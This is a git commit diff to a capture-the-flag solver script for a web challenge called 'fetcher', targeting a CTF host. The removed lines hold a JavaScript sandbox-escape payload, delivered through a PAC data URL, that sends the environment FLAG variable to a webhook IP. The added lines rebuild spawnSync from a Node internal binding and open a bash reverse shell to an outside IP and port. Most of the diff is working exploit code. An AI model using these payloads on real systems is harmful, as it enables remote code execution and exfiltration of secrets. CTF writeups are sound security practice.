c8550a99911d1409b8dbfa3534fc1ce4acfbca48
dimasma0305 <dimasmaulana0305@gmail.com>
2023-09-24 18:52:09 +0800

    feat: fix fetcher exploit

--- Web/fetcher/writeup/solver/solve.py
+++ Web/fetcher/writeup/solver/solve.py
@@ -2,8 +2,7 @@
 from itsdangerous import base64_encode
 import httpx
 
-TARGET = "http://localhost:8080/api/fetch"
-WEBHOOK = "http://108.137.37.157:4444"
+TARGET = "http://ctf.tcp1p.com:56662/"
 
 payload = "pac+data:plain/text;base64,"
 payload += base64_encode("""
@@ -21,13 +20,20 @@ p.constructor = {
         constructor(executor) {
             executor(
                 (x) => x,
-                (err) => { return err.constructor.constructor('fetch("{WEBHOOK}?"+process.env.FLAG)')(); }
+                (err) => { return err.constructor.constructor(`
+let spawnSync = this.constructor.constructor(`
+spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}
+return function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
+`)()
+let exec = (x)=>spawnSync("bash",['-c',x])
+console.log(exec("sh -i >& /dev/tcp/108.137.37.157/4444 0>&1"))
+`)(); }
             )
         }
     }
 };
 p.then();`)
-""".replace("{WEBHOOK}", WEBHOOK)).decode()
+""").decode()
 
 res = httpx.get(TARGET, params={
     "url": "https://google.com",
